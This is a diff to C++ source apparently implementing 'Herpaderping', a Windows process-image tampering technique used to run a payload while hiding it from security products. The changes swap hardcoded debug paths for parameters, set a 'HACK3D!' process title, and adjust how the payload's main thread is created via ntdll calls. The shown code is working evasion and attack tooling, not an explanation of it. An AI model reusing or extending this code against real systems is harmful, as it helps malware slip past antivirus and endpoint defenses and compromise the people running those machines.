@@ -8,7 +8,7 @@ constexpr auto TARGET_PROCESS_TITLE = L"You have been hack3d!";
 Herpaderping::Herpaderping(std::string path_to_source, 
 						   std::string path_to_target, 
 						   std::string path_to_cover,
-						   const char* windows_station_to_run_on) :
+						   const wchar_t* windows_station_to_run_on) :
 	windows_station_to_run_on(windows_station_to_run_on),
 	section_handle(),
 	target_process(),
@@ -162,13 +162,10 @@ void Herpaderping::create_and_run_target_main_thread()
 	current_process_peb = *reinterpret_cast<PEB64*>(current_process_pbi.PebBaseAddress);
 
 	// Initialize relevant parameters.
-	//ntdll_functions->RtlInitUnicodeString(&image_path_name, string_to_wstring(path_to_target).c_str());
-	//ntdll_functions->RtlInitUnicodeString(&command_line, string_to_wstring("\"" + path_to_target + "\"").c_str());
-	ntdll_functions->RtlInitUnicodeString(&image_path_name, L"C:\\Users\\idano\\Workspace\\Projects\\herpaderping\\Herpaderping\\x64\\Debug\\target.exe");
-	ntdll_functions->RtlInitUnicodeString(&command_line, L"\"C:\\Users\\idano\\Workspace\\Projects\\herpaderping\\Herpaderping\\x64\\Debug\\target.exe\"");
-	ntdll_functions->RtlInitUnicodeString(&title, L"Test");
-	//ntdll_functions->RtlInitUnicodeString(&desktop_info, string_to_wstring(windows_station_to_run_on).c_str());
-	ntdll_functions->RtlInitUnicodeString(&desktop_info, L"WinSta0\\Desktop");
+	ntdll_functions->RtlInitUnicodeString(&image_path_name, string_to_wstring(path_to_target).c_str());
+	ntdll_functions->RtlInitUnicodeString(&command_line, string_to_wstring("\"" + path_to_target + "\"").c_str());
+	ntdll_functions->RtlInitUnicodeString(&title, L"HACK3D!");
+	ntdll_functions->RtlInitUnicodeString(&desktop_info, windows_station_to_run_on);
 
 	ntdll_functions->RtlCreateProcessParametersEx(&process_parameters,
 		&image_path_name,
@@ -235,8 +232,7 @@ void Herpaderping::create_and_run_target_main_thread()
 	// Calculate the absolute address of the entry point.
 	ULONGLONG entry_point = process_peb.ImageBaseAddress + payload_nt_header->OptionalHeader.AddressOfEntryPoint;
 
-	HANDLE created;
-	ntdll_functions->NtCreateThreadEx(&created,
+	ntdll_functions->NtCreateThreadEx(&thread_handle,
 		THREAD_ALL_ACCESS,
 		nullptr,
 		this->target_process,
@@ -247,7 +243,7 @@ void Herpaderping::create_and_run_target_main_thread()
 		0,
 		0,
 		nullptr);
-	if (NULL == created) {
+	if (NULL == thread_handle) {
 		throw std::runtime_error("NtCreateThreadEx: failed to create target process' main thread. Error: " + error_to_str(GetLastError()));
 	}
 }
